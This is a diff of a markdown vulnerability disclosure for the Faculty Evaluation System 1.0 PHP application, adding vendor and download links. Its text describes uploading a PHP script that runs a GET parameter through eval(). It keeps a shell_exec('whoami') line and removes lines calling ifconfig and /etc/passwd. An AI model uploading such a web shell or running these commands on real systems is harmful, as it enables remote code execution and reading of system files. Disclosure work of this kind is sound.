@@ -1,4 +1,8 @@
-# Faculty Evaluation System
+# Faculty Evaluation System 1.0
+
++ Vendor Homepage: https://www.sourcecodester.com/php/14635/faculty-evaluation-system-using-phpmysqli-source-code.html
++ Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/eval_2.zip
++ Tested on: XAMPP + win10
 
 First, create a simple PHP script to trigger the vulnerability. The following PHP code will utilize the GET parameter and execute it through the eval() function:
 
@@ -13,10 +17,7 @@ When you see this page, you will know that the program has executed successfully
 
 ![image](https://github.com/Trinity-SYT-SECURITY/arbitrary-file-upload-RCE/assets/96654161/7dbac24e-7e55-4050-8014-0b1ab115f15c)
 
-+ echo shell_exec('/sbin/ifconfig eth0');
 + echo shell_exec('whoami');
-+ echo shell_exec('/etc/passwd');
-
 
 ![](https://hackmd.io/_uploads/B1KnDvgw2.png)
 
